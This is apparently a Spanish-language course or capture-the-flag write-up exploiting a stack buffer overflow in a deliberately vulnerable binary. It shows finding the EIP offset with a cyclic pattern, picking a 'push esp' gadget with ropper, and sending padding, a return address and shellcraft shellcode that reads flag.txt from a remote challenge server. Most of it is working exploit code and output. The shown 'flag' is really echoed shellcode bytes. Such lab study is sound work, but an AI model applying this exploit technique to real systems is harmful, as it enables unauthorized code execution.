# Paso a paso de solución

La solución fue llevada a cabo en WSL con gcc, gdb y uv (Python 3.11.x).

## Paso 1: buscar el padding

Para automatizar la busqueda del padding, se generó un archivo que lo simplifica:

```bash
uv run --with pwntools python3 -c "from pwn import *; print(cyclic(100).decode())" > payload.txt
```

> Nota: Se uso el manejador de dependencias de python uv para simplificar la ejecucion, se adjuntan los archivos de configuracion. En ultimas se quiere un archivo `payload.txt` con un formato tipo `aaaabaaacaaad...` donce cada letra es un byte, para asi poder identificar el lugar exacto donde ocurrio el segmentation fault al acceder al registro EIP.

Una vez generado el payload, en gdb se hace lo siguiente:

```bash
gdb vulnShellCode
(gdb) run < payload.txt
```

Esto resulta en algo como:

```bash
(gdb) run < payload.txt
Starting program: /mnt/c/AdrianDevelopment/2026-20/QuantumCompCrypto/qcc-hw1.1/vulnShellCode < payload.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Ingrese un string, y este será impreso de vuelta:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
```

Al revisar los registros podemos confirmar lo siguiente:

```bash
(gdb) i r
eax            0x0                 0
...
eip            0x6161616c          0x6161616c
...
gs             0x63                99
```

El byte menos significativo en el registro EIP es 6c, que equivale a l. Por lo tanto, en el payload debemos contar la cantidad de bytes que hay entre el primer byte y el byte l (gracias a pwntools, se garantiza que cada conjunto de 4 bytes es unico, por lo tanto solo hay una aparcicion de aaal).

Esto se hace en el script de python de la siguiente manera:

```python
with open("payload.txt", "rb") as f:
    payload_string = f.read()

# 0x6161616c = aaaal -> buscar l
OFFSET = payload_string.find(b'l')
print(f"[+] Offset calculado {OFFSET}")
```

Una vez con el offset calculado, podemos instertar el padding (en bytes):

```python
padding = b'A'*OFFSET
```

## Encontrar el gadget

Para encontrar el gadget, hay que usar ropper:

```bash
ropper --file vulnShellCode --search "push esp"
```

Al ejecutar el comando, obtenemos lo siguiente:

```bash
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: push esp

[INFO] File: vulnShellCode
0x000010a6: push esp; mov ebx, dword ptr [esp]; ret;
```

Esto significa que, como la direcciones de memoria son estaticas, el gadget se encuentra en `0x080410a6` (la suma entre `0x08040000` y `0x000010a6`)
En el script se define facilmente como:

```python
GADGETADDR = 0x080410a6
return_address = p32(GADGETADDR)
```

## Shellscript y ejecucion

Los ultimos pasos son simplemente usar shellcraft para ejecutar el script y unir todo en el payload final:

```python
shellc = asm(shellcraft.cat('flag.txt')) # directamente acceder al flag

payload = padding + return_address + shellc # payload completo :)

print(f"[*] Enviando payload de longitud: {len(payload)}")
p.sendline(payload)
p.interactive()
```

Para ejecutar basta con ejecutar el siguiente comando:

```bash
uv run exploit.py
```

El resultado será algo como esto:

```bash
[+] Opening connection to 32.199.164.87 on port 1337: Done
[+] Offset calculado 44
[*] Enviando payload de longitud: 91
[*] Switching to interactive mode
Ingrese un string, y este será impreso de vuelta:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa6\x10\x04\x08j\x01\xfe\x0c$h.txthflag\x89\xe31\xc9j\x05X̀j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb̀
[*] Got EOF while reading in interactive
$
```

Y el flag obtenido de flag.txt seria:

```bash
flag\x89\xe31\xc9j\x05X̀j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb̀
```
